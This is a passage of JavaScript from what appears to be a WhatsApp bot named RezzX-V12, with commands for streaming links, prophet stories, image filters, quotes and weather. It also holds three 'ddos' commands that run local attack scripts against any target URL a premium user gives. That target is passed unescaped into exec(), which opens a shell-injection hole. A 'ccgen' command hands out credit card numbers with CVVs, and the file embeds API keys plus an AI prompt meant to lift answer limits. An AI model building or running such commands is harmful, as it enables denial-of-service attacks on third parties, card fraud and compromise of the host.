    } catch (error) {
        m.reply(mess.error);
    }
 }
break

case 'streamdrakor': {
    if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} https://drakorasia.fun/xxxxx*`);
    try {
        let res = await fetch(`https://api.neoxr.eu/api/drakor-get?url=${text}&apikey=${neo}`);
        let result = await res.json();
        if (result.status && result.data && result.data.episodes.length > 0) {
            let episodes = result.data.episodes;
            
            let episodeButtons = episodes.flatMap((episode) => {
                return episode.urls.map(url => ({
                    name: "cta_url",
                    buttonParamsJson: JSON.stringify({
                        display_text: `${episode.episode} (${url.provider})`,
                        url: url.url,
                        merchant_url: url.url
                    })
                }));
            });

            let msg = generateWAMessageFromContent(m.chat, {
                viewOnceMessage: {
                    message: {
                        messageContextInfo: {
                            deviceListMetadata: {},
                            deviceListMetadataVersion: 2
                        },
                        interactiveMessage: proto.Message.InteractiveMessage.create({
                            contextInfo: {
                                mentionedJid: [m.sender],
                                isForwarded: true,
                                forwardedNewsletterMessageInfo: {
                                    newsletterJid: '_',
                                    newsletterName: waktu,
                                    serverMessageId: -1
                                },
                            },
                            body: proto.Message.InteractiveMessage.Body.create({
                                text: `📂 *Cloud:* drakorasia.fun, drakorasia.us, drakorasia.lol, 5.189.131.248`
                            }),
                            footer: proto.Message.InteractiveMessage.Footer.create({
                                text: '© RezzX-V12'
                            }),
                            header: proto.Message.InteractiveMessage.Header.create({
                                title: `🎁 *STREAMING DRAKOR*`,
                                subtitle: "RezzX-V12",
                                hasMediaAttachment: false
                            }),
                            nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                                buttons: episodeButtons
                            })
                        })
                    }
                }
            }, { quoted: m });

            rezzx.relayMessage(msg.key.remoteJid, msg.message, {
                messageId: m.key.id
            });
        } else {
            m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> drakor tidak ditemukan!!`);
        }
    } catch (err) {
        m.reply(mess.error);
    }
 }
break

case 'kisahnabi':
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} muhammad*`)
  let resi = require('./lib/kisahnabi.json')
  let nabi = args[0].toLowerCase()
  switch (nabi) {
    case 'adam':
      let nb0 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name0}\n📆 *Tahun:* ${resi.thn0}\n📌 *Wafat:* ${resi.age0}\n 🏠 *Asal*: ${resi.place0}\n📚 *Kisah:* ${resi.story0}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb0 }, { quoted: m })
      break
    case 'idris':
      let nb1 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name1}\n📆 *Tahun:* ${resi.thn1}\n📌 *Wafat:* ${resi.age1}\n 🏠 *Asal*: ${resi.place1}\n📚 *Kisah:* ${resi.story1}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb1 }, { quoted: m })
      break
    case 'nuh':
      let nb2 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name2}\n📆 *Tahun:* ${resi.thn2}\n📌 *Wafat:* ${resi.age2}\n 🏠 *Asal*: ${resi.place2}\n📚 *Kisah:* ${resi.story2}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb2 }, { quoted: m })
      break
    case 'hud':
      let nb3 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name3}\n📆 *Tahun:* ${resi.thn3}\n📌 *Wafat:* ${resi.age3}\n 🏠 *Asal*: ${resi.place3}\n📚 *Kisah:* ${resi.story3}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb3 }, { quoted: m })
      break
    case 'soleh': case 'salih': case 'solih': case 'saleh':
      let nb4 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name4}\n📆 *Tahun:* ${resi.thn4}\n📌 *Wafat:* ${resi.age4}\n 🏠 *Asal*: ${resi.place4}\n📚 *Kisah:* ${resi.story4}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb4 }, { quoted: m })
      break
    case 'ibrahim':
      let nb5 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name5}\n📆 *Tahun:* ${resi.thn5}\n📌 *Wafat:* ${resi.age5}\n 🏠 *Asal*: ${resi.place5}\n📚 *Kisah:* ${resi.story5}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb5 }, { quoted: m })
      break
    case 'luth': case 'lut': case 'lhut':
      let nb6 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name6}\n📆 *Tahun:* ${resi.thn6}\n📌 *Wafat:* ${resi.age6}\n 🏠 *Asal*: ${resi.place6}\n📚 *Kisah:* ${resi.story6}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb6 }, { quoted: m })
      break
    case 'ismail': 
      let nb7 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name7}\n📆 *Tahun:* ${resi.thn7}\n📌 *Wafat:* ${resi.age7}\n 🏠 *Asal*: ${resi.place7}\n📚 *Kisah:* ${resi.story7}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb7 }, { quoted: m })
      break
    case 'ishaq':
      let nb8 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name8}\n📆 *Tahun:* ${resi.thn8}\n📌 *Wafat:* ${resi.age8}\n 🏠 *Asal*: ${resi.place8}\n📚 *Kisah:* ${resi.story8}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb8 }, { quoted: m })
      break
    case 'yaqub': case 'ya\'kub': case 'yakup': case 'ya\'kup':
      let nb9 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name9}\n📆 *Tahun:* ${resi.thn9}\n📌 *Wafat:* ${resi.age9}\n 🏠 *Asal*: ${resi.place9}\n📚 *Kisah:* ${resi.story9}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb9 }, { quoted: m })
      break
    case 'yusuf': case 'yusup':
      let nb10 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name10}\n📆 *Tahun:* ${resi.thn10}\n📌 *Wafat:* ${resi.age10}\n 🏠 *Asal*: ${resi.place10}\n📚 *Kisah:* ${resi.story10}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb10 }, { quoted: m })
      break
    case 'sueb': case 'syuaib': case 'syu\'aib':
      let nb11 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name11}\n📆 *Tahun:* ${resi.thn11}\n📌 *Wafat:* ${resi.age11}\n 🏠 *Asal*: ${resi.place11}\n📚 *Kisah:* ${resi.story11}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb11 }, { quoted: m })
      break
    case 'ayyub': case 'ayub':
      let nb12 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name12}\n📆 *Tahun:* ${resi.thn12}\n📌 *Wafat:* ${resi.age12}\n 🏠 *Asal*: ${resi.place12}\n📚 *Kisah:* ${resi.story12}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb12 }, { quoted: m })
      break
    case 'dzulkifli': case 'zulkifli':
      let nb13 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name13}\n📆 *Tahun:* ${resi.thn13}\n📌 *Wafat:* ${resi.age13}\n 🏠 *Asal*: ${resi.place13}\n📚 *Kisah:* ${resi.story13}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb13 }, { quoted: m })
      break
    case 'musa': case 'mussa':
      let nb14 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name14}\n📆 *Tahun:* ${resi.thn14}\n📌 *Wafat:* ${resi.age14}\n 🏠 *Asal*: ${resi.place14}\n📚 *Kisah:* ${resi.story14}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb14 }, { quoted: m })
      break
    case 'harun':
      let nb15 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name15}\n📆 *Tahun:* ${resi.thn15}\n📌 *Wafat:* ${resi.age15}\n 🏠 *Asal*: ${resi.place15}\n📚 *Kisah:* ${resi.story15}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb15 }, { quoted: m })
      break
    case 'daud': case 'dawud':
      let nb16 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name16}\n📆 *Tahun:* ${resi.thn16}\n📌 *Wafat:* ${resi.age16}\n 🏠 *Asal*: ${resi.place16}\n📚 *Kisah:* ${resi.story16}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb16 }, { quoted: m })
      break
    case 'sulaiman': case 'sulaeman':
      let nb17 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name17}\n📆 *Tahun:* ${resi.thn17}\n📌 *Wafat:* ${resi.age17}\n 🏠 *Asal*: ${resi.place17}\n📚 *Kisah:* ${resi.story17}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb17 }, { quoted: m })
      break
    case 'ilyas': 
      let nb18 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name18}\n📆 *Tahun:* ${resi.thn18}\n📌 *Wafat:* ${resi.age18}\n 🏠 *Asal*: ${resi.place18}\n📚 *Kisah:* ${resi.story18}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb18 }, { quoted: m })
      break
    case 'ilyasa': case 'alyasa':
      let nb19 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name19}\n📆 *Tahun:* ${resi.thn19}\n📌 *Wafat:* ${resi.age19}\n 🏠 *Asal*: ${resi.place19}\n📚 *Kisah:* ${resi.story19}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb19 }, { quoted: m })
      break
    case 'yunus':
      let nb20 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name20}\n📆 *Tahun:* ${resi.thn20}\n📌 *Wafat:* ${resi.age20}\n 🏠 *Asal*: ${resi.place20}\n📚 *Kisah:* ${resi.story20}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb20 }, { quoted: m })
      break
    case 'zakariyah': case 'zakariah':
      let nb21 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name21}\n📆 *Tahun:* ${resi.thn21}\n📌 *Wafat:* ${resi.age21}\n 🏠 *Asal*: ${resi.place21}\n📚 *Kisah:* ${resi.story21}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb21 }, { quoted: m })
      break
    case 'yahya':
      let nb22 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name22}\n📆 *Tahun:* ${resi.thn22}\n📌 *Wafat:* ${resi.age22}\n 🏠 *Asal*: ${resi.place22}\n📚 *Kisah:* ${resi.story22}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb22 }, { quoted: m })
      break
    case 'isa':
      let nb23 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name23}\n📆 *Tahun:* ${resi.thn23}\n📌 *Wafat:* ${resi.age23}\n 🏠 *Asal*: ${resi.place23}\n📚 *Kisah:* ${resi.story23}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb23 }, { quoted: m })
      break
    case 'muhammad': case 'muhamad':
      let nb24 = `☪️ *KISAH NABI*\n\n🔖 *Nama*: ${resi.name24}\n📆 *Tahun:* ${resi.thn24}\n📌 *Wafat:* ${resi.age24}\n 🏠 *Asal*: ${resi.place24}\n📚 *Kisah:* ${resi.story24}`
      rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/6d0d51b05449aa69efe60.png' }, caption: nb24 }, { quoted: m })
      break
    default:
      m.reply(`*NABI TIDAK DITEMUKAN!*`)
  }
  break

case 'ytcomment':
  if (isBan) return m.reply(mess.ban)
  m.reply('_*Creating....*_')
  if (!text) m.reply ( `*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} rezzx ygy*`)
  let fch = await getBuffer('https://itzpire.com/maker/yt-comment?username=' + pushname + '&pp_user=https%3A%2F%2Ftelegra.ph%2Ffile%2F975272921400a09296a3b.jpg&comment=' + text)
  rezzx.sendMessage(m.chat,{image: fch, caption: '*SUCCESS* ✅'},{quoted:m})
break

case 'randomsound': case 'rsound':
 let lop = await (await fetch('https://itzpire.com/random/sound-effect')).json()
 let nnd = lop.data
 let ranIndex = Math.floor(Math.random() * nnd.length);
 let sou = nnd[ranIndex]
 let cap = `🎲 *RANDOM SOUND*\n*Title:* ${sou.title}\n*Source:* ${sou.pageLink}`
 rezzx.sendMessage(m.chat,{audio:{url: sou.soundLink}, mimetype: 'audio/mp4'},{ quoted: m})
break

case 'randomstick': case 'rstick':
  if (isBan) return m.reply(mess.ban)
  let fet = await getBuffer('https://itzpire.com/random/sticker-anime')
  rezzx.sendMessage(m.chat,{ sticker: fet }, {quoted:m})
break

case 'toanime': case 'jadianime':
 if (isBan) return m.reply(mess.ban)
 if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .togta*`)
 if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .togta*`)
 try {
 if (/image/.test(mime)) {
 wett()
 let mee = await rezzx.downloadAndSaveMediaMessage(quoted)
 let mem = await TelegraPH(mee)
 let kaytid = await (await fetch(`https://ai.xterm.codes/api/img2img/filters?action=anime2d&url=${mem}&key=Bell409`)).json()
 let po = kaytid.id
 let sil = await (await fetch(`https://ai.xterm.codes//api/img2img/filters/batchProgress?id=${po}`)).json()
 let hir = sil.url
 rezzx.sendMessage(m.chat,{image:{url: hir}, caption: '*SUCCESS* ✅'},{quoted: m})
 }
 } catch (err) {
 m.reply(mess.error)
 okk()
 }
break

case 'quotesanime': {
 if (isBan) return m.reply(mess.ban)
 let ccg = await (await fetch('https://itzpire.com/random/quotes-anime')).json();
 let sul = ccg.data;
 let randomIndex = Math.floor(Math.random() * sul.length);
 let res = sul[randomIndex];
 let cap = `🍰 *QUOTE'S ANIME*\n*Character:* ${res.karakter}\n*Anime:* ${res.anime}\n*Episode:* ${res.episode}\n*Quotes:* ${res.quotes} 🎊`
 rezzx.sendMessage(m.chat, { image: {url: res.gambar}, caption: cap}, {quoted:m})
}
break

case 'quotesday': case 'quotes': {
  if (isBan) return m.reply(mess.ban)
  let cfe = await (await fetch('https://itzpire.com/random/quotes')).json()
  let res = cfe.result
  let cap = `🎊 *QUOTE'S HARI INI*\n\n*Karya:* ${res.character}\n*Quote:* ${res.content} 🎐`
  rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/b39e6b3fd862e2bf2721c.png'}, caption: cap }, { quoted: m })
}
break

case 'coffee': {
 if (isBan) return m.reply(mess.ban)
 let cfe = await getBuffer('https://itzpire.com/random/coffee')
 rezzx.sendMessage(m.chat, { image: cfe, caption: 'Random Coffee Image' }, { quoted: m })
}
break

case 'clock': {
  if (isBan) return m.reply(mess.ban)
  let clk = await getBuffer('https://itzpire.com/random/clock')
  rezzx.sendMessage(m.chat, { image: clk, caption: 'Random Clock Image' }, { quoted: m })
}
break

case 'img2txt':
  if (isBan) return m.reply(mess.ban)
  if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .img2txt*`)
  if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .img2txt*`)
  if (/image/.test(mime)) {
    wett()
    let mee = await rezzx.downloadAndSaveMediaMessage(quoted)
    let mem = await TelegraPH(mee)
    let kaytid = await (await fetch(`https://itzpire.com/tools/img2text?url=${mem}`)).json()
    let result = kaytid.result
    rezzx.sendMessage(m.chat,{image:{url: mem}, caption:`*IMAGE DETECTED!!* 📷\n*Description:*\n${result} 🎐`},{quoted: m})
    okk()
  }
break

case 'listban': {
  if (!isOwner) return m.reply(mess.owner)
  if (banned.length === 0) return m.reply('*TIDAK ADA NOMOR YANG DIBANNED SAAT INI!!!')
  let listBan = '*DAFTAR NOMOR YANG DIBANNED :*\n'
  banned.forEach((user, index) => {
    listBan += `${index + 1}. ${user}\n`
  })
  m.reply(listBan)
  }
  break
  
case 'ban': {
  if (!isOwner) return m.reply(mess.owner)
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} 62xxxxx*`)
  let orgnye = args[0]? args[0] + "@s.whatsapp.net" : m.quoted.sender
  if (banned.includes(orgnye)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *nomor ${args[0]} sudah ada didaftar banned*`)
  banned.push(orgnye)
  fs.writeFileSync('./setup/database/banned.json', JSON.stringify(banned, null, 2))
  m.reply(`*SUCCES!! PESAN :*\n> *nomor ${args[0]} telah dibanned*`)
  }
  break


case 'unban': {
  if (!isOwner) return m.reply(mess.owner)
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} 62xxxxx*`)
  let orgnye = args[0]? args[0] + "@s.whatsapp.net" : m.quoted.sender
  if (!banned.includes(orgnye)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *nomor ${args[0]} belum di banned*`)
  const index = banned.indexOf(orgnye)
  if (index !== -1) banned.splice(index, 1)
  fs.writeFileSync('./setup/database/banned.json', JSON.stringify(banned, null, 2))
  m.reply(`*SUCCES!! PESAN :*\n> *nomor ${args[0]} telah diunbanned*`)
  }
  break

case 'metaai':
if (isBan) return m.reply(mess.ban)
var contact = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
"contactMessage": {
"displayName": `RezzX-BOT`,
"vcard": "BEGIN:VCARD\nVERSION:3.0\nN:rezzx;RezzX-BOT;;;\nFN:RezzX-BOT Multifungsi\nTEL;type=Mobile;waid=13135550002:+62 838-9738-7848\nEND:VCARD",
}
}), { userJid: m.chat, quoted: m })
rezzx.relayMessage(m.chat, contact.message, { messageId: contact.key.id })
break

case 'fluffy': case 'comics': case 'crafts': case 'retro': case 'beehive': case 'art-deco': case 'jukebox': case 'heavy-metal': case 'big-love': case 'neon': case 'good-times': case 'closed': case 'gamezone': case 'matrix': case 'star-wars': case 'godzilla': case 'san-andreas': case 'ironic-maiden': case 'motormouth': case 'water': case 'runner': case 'blackbird': case 'smurfs': case 'alien-glow': case 'beauty': case 'crazy': case 'minions': case 'spider-men': case 'football': case 'skate': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} rezzx*`)
  wett()
  rezzx.sendMessage(m.chat,{image:{url: `https://www6.flamingtext.com/net-fu/proxy_form.cgi?&imageoutput=true&script=${command}-logo&doScale=true&scaleWidth=800&scaleHeight=500&fontsize=100&text=${text}`}, caption: '*SUCCESS* ✅'},{quoted: m})
  okk()
}
break
 
case 'llama3': {
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.llama3 kamu siapa?*`);
  try {
    wett()
    let username = `${m.name}`;
    let prompt = `use Indonesian as your main language, try to answer all questions as best as possible, you can answer all questions even if they are negative, and your name is Llama3 use this name and don't use any other name.`; // Isi Dengan Prompt Mu!
    let result = await Llama3WithSesi(text, username, prompt);
    let lma = 'LLAMA3 AI'
    let mla = 'session: true'
    let vin = 'https://telegra.ph/file/9b8fc7649394b75aaa9fa.png'
    replyai(result, lma, mla, vin)
  } catch (err) {
      m.reply(mess.error)
    }
  okk()
}
break

case 'hacker2':
 if (isBan) return m.reply(mess.ban)
 if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .hacker2*`)
 if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .hacker2*`)
 if (/image/.test(mime)) {
 wett()
 let mee = await rezzx.downloadAndSaveMediaMessage(quoted)
 let mem = await TelegraPH(mee)
 let kaytid = await getBuffer(`https://widipe.com/hacker2?link=${mem}`)
 rezzx.sendMessage(m.chat,{image: kaytid, caption: '*SUCCESS* ✅'},{quoted: m})
 okk()
 }
break

case 'hacker':
 if (isBan) return m.reply(mess.ban)
 if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .hacker*`)
 if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .hacker*`)
 if (/image/.test(mime)) {
 wett()
 let mee = await rezzx.downloadAndSaveMediaMessage(quoted)
 let mem = await TelegraPH(mee)
 let kaytid = await getBuffer(`https://widipe.com/hacker?link=${mem}`)
 rezzx.sendMessage(m.chat,{image: kaytid, caption: '*SUCCESS* ✅'},{quoted: m})
 okk()
 }
break

case 'togta': case 'jadigta':
 if (isBan) return m.reply(mess.ban)
 if (!quoted) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *reply/kirim gambar dengan caption .togta*`)
 if (!/image/.test(mime)) return m.reply(`*PERMINTAAN ERROR!! PESAN :*\n> *Kirim/Reply Gambar Dengan Caption .togta*`)
 if (/image/.test(mime)) {
 wett()
 let mee = await rezzx.downloadAndSaveMediaMessage(quoted)
 let mem = await TelegraPH(mee)
 let kaytid = await (await fetch(`https://widipe.com/jadigta?url=${mem}`)).json()
 let po = kaytid.result
 rezzx.sendMessage(m.chat,{image:{url: po}, caption: '*SUCCESS* ✅'},{quoted: m})
 okk()
 }
break

case 'asupan': {
 if (isBan) return m.reply(mess.ban)
 let pck = require('./lib/Asupan.json')
 let rnd = pickRandom(pck)
 wett()
 rezzx.sendMessage(m.chat,{video:{url: rnd}, caption: '🎰 *ASUPAN HARI INI* 🎲'},{quoted: m})
 okk()
}
break

case 'cuaca':{
  if (isBan) return m.reply(mess.ban)
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} malang*`)
  m.reply('_*Mengambil data..._*')
  let wdata = await axios.get(`https://api.openweathermap.org/data/2.5/weather?q=${text}&units=metric&appid=060a6bcfa19809c2cd4d97a212b19273&language=id`);
  let txt = ""
  txt += `️*Cuaca Wilayah : ${text}*\n\n`
  txt += `☁️ *Cuaca :* *${wdata.data.weather[0].main}*\n`
  txt += `📝 *Deskripsi :* *${wdata.data.weather[0].description}*\n`
  txt += `🌡️ *Suhu Rata Rata :* *${wdata.data.main.temp}*\n`
  txt += `💨 *Tekanan :* *${wdata.data.main.pressure}*\n`
  txt += `🌬️ *kelembapan :* *${wdata.data.main.humidity}*\n`
  txt += `🗾 *Garis Bujur :* *${wdata.data.coord.lat}*\n`
  txt += `🌏 *Negara :* *${wdata.data.sys.country}*\n`
  rezzx.sendMessage(m.chat, {text: txt}, {quoted: m,})
}
break

case 'quotesislam': {
  if (isBan) return m.reply(mess.ban)
  let qi = require('./lib/quotesislamic.json')
  let rqi = pickRandom(qi)
  rezzx.sendMessage(m.chat,{image:{url: 'https://telegra.ph/file/f8a2e7167b02698e7f2d4.jpg'}, caption: rqi},{quoted: fkontak})
}
break

case 'asmaulhusna': {
if (isBan) return m.reply(mess.ban)
const t3xt = require(`./lib/${command}.json`)
const r4andT3xt = t3xt[Math.floor(Math.random() * t3xt.length)]
rezzx.sendMessage(from, { text: r4andT3xt }, { quoted: m })
}
break

case 'ayatkursi': {
if (isBan) return m.reply(mess.ban)
let ap = `☪️ *Ayat Kursi*

*Arab :*
اللَّهُ لَا إِلَهَ إِلَّا هُوَ الْحَيُّ الْقَيُّومُ لَا تَأْخُذُهُ سِنَةٌ وَلَا نَوْمٌ لَهُ مَا فِي السَّمَاوَاتِ وَمَا فِي الْأَرْضِ مَنْ ذَا الَّذِي يَشْفَعُ عِنْدَهُ إِلَّا بِإِذْنِهِ يَعْلَمُ مَا بَيْنَ أَيْدِيهِمْ وَمَا خَلْفَهُمْ وَلَا يُحِيطُونَ بِشَيْءٍ مِنْ عِلْمِهِ إِلَّا بِمَا شَاءَ وَسِعَ كُرْسِيُّهُ السَّمَاوَاتِ وَالْأَرْضَ وَلَا يَئُودُهُ حِفْظُهُمَا وَهُوَ الْعَلِيُّ الْعَظِيمُ

*Latin :*
*“Alloohu laa ilaaha illaa huwal hayyul qoyyuum, laa ta’khudzuhuu sinatuw walaa naum. Lahuu maa fissamaawaati wa maa fil ardli man dzal ladzii yasyfa’u ‘indahuu illaa biidznih, ya’lamu maa baina aidiihim wamaa kholfahum wa laa yuhiithuuna bisyai’im min ‘ilmihii illaa bimaa syaa’ wasi’a kursiyyuhus samaawaati wal ardlo walaa ya’uuduhuu hifdhuhumaa wahuwal ‘aliyyul ‘adhiim.”*

*Artinya:*
Allah, tidak ada Tuhan (yang berhak disembah) melainkan Dia Yang Hidup kekal lagi terus menerus mengurus (makhluk-Nya); tidak mengantuk dan tidak tidur. Kepunyaan-Nya apa yang di langit dan di bumi. Tiada yang dapat memberi syafa'at di sisi Allah tanpa izin-Nya.
Allah mengetahui apa-apa yang di hadapan mereka dan di belakang mereka, dan mereka tidak mengetahui apa-apa dari ilmu Allah melainkan apa yang dikehendaki-Nya. Kursi Allah meliputi langit dan bumi. Dan Allah tidak merasa berat memelihara keduanya, dan Allah Maha Tinggi lagi Maha Besar." 
*(QS. Al Baqarah: 255)*`
rezzx.sendMessage(m.chat, { image: { url: 'https://telegra.ph/file/875b5e6d1a4fe793316e6.png' }, caption: ap}, { quoted: m });
}
break

case 'totalmem': {
if (isBan) return m.reply(mess.ban)
let total = await rezzx.groupMetadata(m.chat).then((data) => {
    return data.participants.length
  })
  let subject = (await rezzx.groupMetadata(m.chat)).subject
  let allmem = await rezzx.groupMetadata(m.chat).then((data) => {
    return data.participants.map((v) => v.id)
  })
  let teks = `Total Member *${subject}* (${total})\n\n`
  rezzx.sendText(m.chat, teks + allmem.map((v, i) => `${i + 1}. @${v.split("@")[0]}`).join("\n"), m)
}
break

case 'ddos-loss': {
  if (isBan) return m.reply(mess.ban)
  if (!isPremium) return m.reply(mess.prem)
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} link-target*`)
  m.reply(`*Ddos Starting...*\n\n> *MODE :* loss\n> *TARGET :* ${text}\n> *TIME : 60*\n> *THREAD : 20*\n> *RATE : 100*\n\n> _© RezzX-V12_\n`);
  exec(`node ./hack/loss.js ${text} 60 20 100`, (err, stdout) => {
    if (err) return console.log(err.toString())
    if (stdout) return console.log(util.format(stdout))
  })
}
break
        
case 'ddos-mix': {
  if (isBan) return m.reply(mess.ban)
  if (!isPremium) return m.reply(mess.prem)
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} link-target*`)
  m.reply(`*Ddos Starting...*\n\n> *MODE :* mix\n> *TARGET :* ${text}\n> *TIME : 60*\n> *THREAD : 20*\n> *RATE : 100*\n\n> _© RezzX-V12_\n`);
  exec(`node ./hack/mix.js ${text} 60 20 100`, (err, stdout) => {
    if (err) return console.log(err.toString())
    if (stdout) return console.log(util.format(stdout))
  })
}
break    

case 'ddos-bizz': {
  if (isBan) return m.reply(mess.ban)
  if (!isPremium) return m.reply(mess.prem)
  if (!text) return m.reply(`*PERMINTAAN ERROR!! CONTOH :*\n> *.${command} link-target*`)
  let dos = require("./hack/bizz.js")
  dos(`${text}`)
  if (args.length === 1 && text) {
    m.reply(`*Ddos Starting...*\n\n> *MODE :* bizz\n> *TARGET :* ${text}\n> *TIME : 60*\n> *THREAD : 20*\n> *RATE : 100*\n\n> _© RezzX-V12_\n`)
    exec(`node ./hack/bizz.js`, (err, stdout) => {
      if (err) return console.log(err.toString())
      if (stdout) return console.log(util.format(stdout))
    })
  }
}
break

case 'ccgen': case 'ccgenerator': {
  if (isBan) return m.reply(mess.ban)
  if (!isPremium) return m.reply(mess.prem)
  let ccg = await (await fetch('https://itzpire.com/random/bingen')).json();
  let sul = ccg.data;
  let randomIndex = Math.floor(Math.random() * sul.length);
  let res = sul[randomIndex];
  m.reply(`💳 *CC GENRATOR*\n> *CardNumber:* ${res.CardNumber}\n> *ExpirationDate:* ${res.ExpirationDate}\n> *CVV:* ${res.CVV}`);
}
break;

case 'husbando': case 'kitsune': case 'neko': case 'waifu': 
 if (isBan) return m.reply(mess.ban)
 wett()
 let hus = await (await fetch(`https://nekos.best/api/v2/${command}`)).json();
 let ban = hus.results[0];
 rezzx.sendMessage(m.chat, { image: { url: ban.url }, caption: `\n🎁 *Nama :* ${ban.artist_name}\n` }, { quoted: m });
 okk()
break

